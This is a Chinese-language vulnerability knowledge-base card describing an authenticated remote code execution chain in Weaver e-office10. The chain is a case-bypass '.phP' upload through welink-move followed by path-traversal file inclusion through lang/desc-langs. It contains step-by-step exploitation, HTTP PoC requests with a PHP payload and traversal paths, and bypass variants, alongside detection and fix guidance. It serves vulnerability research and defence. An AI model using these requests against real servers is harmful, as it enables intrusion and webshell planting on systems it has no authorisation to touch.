---
id: web-generic-file-upload-weaver-eoffice10-welink-move-php-lang-include-rce
title: 泛微 e-office10 welink-move 上传 .phP 大小写绕过 + lang/desc-langs 路径穿越文件包含 RCE
type: scenario
domain: web
path: web/generic/file-upload
technique: weaver-eoffice10-welink-upload-case-bypass-lang-include-rce
tags:
- php
- file-upload
- file-inclusion
- path-traversal
- rce
- weaver
- eoffice
- windows
- case-insensitive
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-13'
updated: '2026-11-13'
verification:
  verified_by: verifier-V637
  verified_at: '2026-11-13T01:28:15+08:00'
  notes: 已对照原文与17张截图逐项核对：welink-move 上传 multipart 字段 file 文件名 1.phP、JPG 内容+PHP、附件落盘 attachment/2023/11/29/<id>/1.phP 且不可直连（内容/11图）；LangService::getArrayFromPhp 对路径 require（12图）；getLangFileFullPath 拼接 serverLangFolder + '/' + fileName + '.php'（13图）；getPhpLangArrayByModule/getServerStaticLangsByModule 的 module 可控（14/15图）；LangController@getConsultAndTransLangs + /lang/desc-langs 路由（16图）；带 Authorization 实际请求 desc-langs 穿越包含 1.phP 并回显 phpinfo PHP 7.4.30（17图）。原文仅称 e-office10，未标注具体版本，affected_versions 保持空。dedup 仅命中草稿自身（同一卡已在库），其余候选为 E10/e-Bridge/WebOffice 等不同产品链，非同链；dup-scan 未涉及。注：本卡 front matter/id 规范为小写 php，库内增量索引残留一条大写 phP 旧行，已清理使 id 与文件一致。未验证点：PoC 未在本机执行；welink-move 的鉴权方式原文请求未显式给出 Authorization，卡片补齐为后台 Bearer 属合理推断。
url: /docs/web/generic/file-upload/web-generic-file-upload-weaver-eoffice10-welink-move-php-lang-include-rce/
draft: false
kb_aliases:
- 泛微 e-office10 RCE
- welink-move 文件上传
- lang/desc-langs 文件包含
- .phP 大小写绕过
- getLangFileFullPath
- getArrayFromPhp require
---

## 一句话结论

泛微 e-office10 的 `/eoffice10/server/public/api/welink/welink-move` 上传接口只校验图片内容、扩展名过滤可用大小写 `.phP` 绕过，附件落在不可直接访问的 attachment 目录；随后 `/eoffice10/server/public/api/lang/desc-langs` 的 `module`/`consult_lang`/`trans_lang` 参数进入 `getLangFileFullPath` 拼接 `.php` 并 `require`，用 `../../` 路径穿越配合 Windows 文件名大小写不敏感即可包含已上传的 `1.phP`，执行任意 PHP 代码。

## 原理

- **上传点**：`Welink::welinkMove($data)`（`app/Utils/Welink.php`）用 `pathinfo($data->getClientOriginalName())` 取 `filename` 与 `extension`，把文件保存为 `<attachmentId>/<原文件名>.<原扩展名>`，落盘在 `getAttachmentDir()`（`attachment/YYYY/MM/DD/<attachmentId>/`）。代码只做内容校验（按 JPG 处理），直接上传 `.php` 会被扩展名过滤拦截，但过滤区分大小写，`.phP` 可以通过；响应返回 `attachmentId`、`attachmentName`、附件路径与 `attachmentThumb`。
- **附件不可直连**：上传目录不在 Web 可直接访问的路径下（原文强调"上传在 attachment 目录不能直接访问"），所以单纯上传不构成 RCE，需要二次包含。
- **文件包含 sink**：`LangService::getArrayFromPhp($file)` 对路径执行 `require $file`（`if (file_exists($file)) { $array = (require $file); ... }`）；`getLangFileFullPath($locale, $fileName)` 的服务端分支为
  `getServerLangFolder($locale) . "/" . $fileName . $this->serverLangSuffix`
  其中 `serverLangSuffix` 为 `.php`，`getServerLangFolder()` 指向 `eoffice10\server\resources` 目录。
- **参数可控**：调用链 `getServerStaticLangsByModule($consultLocal, $transLocal, $module)` → `getPhpLangArrayByModule($locale, $module)` → `getLangFileFullPath($locale, $module)`；对应路由 `GET /eoffice10/server/public/api/lang/desc-langs`，控制器 `LangController@getConsultAndTransLangs` 在 `lang_package_type=1` 时把 `consult_lang`、`trans_lang`、`module` 原样传入。`locale` 决定目录、`module` 决定文件名，两者都可用于路径穿越。
- **大小写不敏感命中**：`module` 传 `../../../../attachment/2023/11/29/<attachmentId>/1`，拼接后为 `.../1.php`；Windows 文件系统不区分大小写，`1.php` 会命中之前上传的 `1.phP`，`require` 按 PHP 代码执行——include/require 只看内容、不看扩展名。
- **认证前提**：`desc-langs` 与 `welink-move` 均需后台 Authorization（Bearer JWT）。原文先用 IM 服务 SQL 注入拿到管理员账号口令，登录后获取 token，再完成上传与包含。
- **为什么成立**：扩展名黑名单大小写不一致 + Windows 大小写不敏感 + 语言包路径拼接无 `realpath` 约束 + `require` 直接执行用户可控路径，四个缺陷叠加。

## 触发条件

- 目标为 Windows 部署的泛微 e-office10（大小写不敏感是包含成功的必要条件；官方试用主要为 Windows exe 部署）。
- 已取得可调用上传与语言包接口的后台凭据/`Authorization`（如通过 IM 服务 SQL 注入获得）。
- 上传接口扩展名过滤未覆盖大小写变体，内容校验仅要求图片格式（JPG/PNG 头即可）。
- 能确定附件相对路径（响应返回，或按 `attachment/年/月/日/<id>/` 规则拼接）。
- PHP 进程对 attachment 目录有读权限（默认同站点目录）。

## 利用步骤

1. 用后台账号登录 e-office10，获取 `Authorization: Bearer <JWT>`（原文通过 IM SQLi 获取账号口令后登录）。
2. 上传 PHP 载荷：POST `/eoffice10/server/public/api/welink/welink-move`，multipart 字段 `file`，`filename="1.phP"`，内容为合法 JPG 头 + `<?php ... ?>`；响应返回 `attachmentId` 与附件路径（如 `attachment\2023\11\29\8de8701f16a64d88f5fda3ad1b3f5375\1.phP`）。
3. 记录附件相对路径并换算为可穿越的路径片段。
4. 计算 `module` 穿越深度：从 `eoffice10/server/resources` 出发，用 `../../../../attachment/.../1` 指向上传文件；`consult_lang`/`trans_lang` 同样可配合穿越控制目录。
5. 带 Authorization 请求：
   `GET /eoffice10/server/public/api/lang/desc-langs?lang_package_type=1&consult_lang=0&trans_lang=<穿越路径>&module=<穿越路径>/1`
   服务端 `require` 到 `1.phP`（Windows 按 `1.php` 命中），响应中回显 PHP 执行结果（如 phpinfo）。
6. 将载荷替换为 webshell 或命令执行代码，验证命令执行。

## PoC

```http
POST /eoffice10/server/public/api/welink/welink-move HTTP/1.1
Host: target:8010
Authorization: Bearer <JWT>
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryvQIRygBK

------WebKitFormBoundaryvQIRygBK
Content-Disposition: form-data; name="file"; filename="1.phP"
Content-Type: image/png

<JPG 文件头字节>
<?php phpinfo(); ?>
------WebKitFormBoundaryvQIRygBK--
```

```http
GET /eoffice10/server/public/api/lang/desc-langs?lang_package_type=1&consult_lang=0&trans_lang=../../../../attachment/2023/11/29/8de8701f16a64d88f5fda3ad1b3f5375/1&module=../../../../attachment/2023/11/29/8de8701f16a64d88f5fda3ad1b3f5375/1 HTTP/1.1
Host: target:8010
Authorization: Bearer <JWT>
```

说明：以上为原文请求的结构化复现，未在本机执行；仅用于授权测试。穿越层数按实际部署目录深度调整；响应中返回 `PHP Version` 等信息即证明包含执行成功。

## 变体与关联

- **上传点变体**：任何保留原文件名/扩展名的上传接口都可能复用同一"上传 + 语言包包含"组合；`welink-move` 之外可留意 `attachment` 相关 API。
- **包含点变体**：`getArrayFromJson`/其它 `getLangFileFullPath` 调用方（不同 `lang_package_type`、`consult_lang`/`trans_lang`）也可能进入同一 `require`；语言包控制器还有 `getConsultAndTransLangsByModule` 等入口。
- **绕过变体**：若目标过滤大小写统一后的扩展名，可尝试 `.php5`/`.phtml` 等仍能被执行的后缀；Windows 8.3 短文件名、末尾空格/点等也可与包含路径组合。
- **关联**：[[web-generic-sqli-weaver-eoffice10-im-socketio-loginuserid-union]]（上游：IM SQL 注入获取后台口令与 JWT）、[[web-generic-file-upload-weaver-e10-upload-move-updatemaster-powershell-rce]]（泛微 E10 另一条上传+触发链，产品线与触发方式不同）、[[web-generic-file-inclusion-weaver-e10-0981-dash-path-traversal-read]]（泛微 E10 路径穿越读取，可对比穿越手法）。
- **边界**：Linux 部署时大小写不敏感不成立，`1.php` 无法命中 `1.phP`（需另找后缀/绕过）；无后台凭据、上传接口被网关拦截、attachment 目录不可被 PHP 读取、或语言包接口已修复路径校验时，本链不成立。

## 检测与防御

- **上传修复**：扩展名白名单统一转小写后校验（并覆盖 `.phP`、`.phtml` 等变体）；内容校验使用 `getimagesize`/magic bytes 后对图片重编码，剥离附加 PHP 代码；文件随机重命名且不保留危险扩展名。
- **包含修复**：语言包文件使用固定白名单/映射表，不接受外部路径；拼接后 `realpath` 必须位于 `resources` 目录内；禁止 `require` 用户可控路径。
- **加固**：上传目录与语言包目录分离、上传目录禁止脚本执行（Windows 下 ACL/AppLocker/Web 服务器 handler 配置）；后台接口强制鉴权与最小权限；及时升级 e-office10。
- **检测**：监控上传请求中文件名为 `.phP`/`.pHp` 等大小写变体、内容包含 `<?php` 的图片文件；监控 `desc-langs` 请求参数中出现 `../`、`attachment\`、异常 `lang_package_type`；审计 PHP `require` 加载 attachment 路径的行为与 phpinfo/webshell 响应特征。
- **响应**：发现可疑附件立即隔离删除，轮换后台账号与 JWT 密钥，排查同目录其它上传文件与访问日志中的包含请求。
